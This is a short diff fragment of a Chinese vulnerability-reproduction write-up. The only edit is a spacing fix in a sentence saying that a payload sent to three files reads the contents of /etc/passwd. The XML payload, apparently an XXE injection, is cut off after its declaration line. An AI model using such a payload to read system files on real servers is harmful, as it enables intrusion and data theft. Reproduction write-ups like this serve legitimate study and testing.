@@ -35,7 +35,7 @@ $ tree .
 
 ## 漏洞复现
 
-向上述3个文件发送以下 payload 即可读取 `/etc/passwd` 文件内容：
+向上述 3 个文件发送以下 payload 即可读取 `/etc/passwd` 文件内容：
 
 ```xml
 <?xml version="1.0" encoding="utf-8"?> 
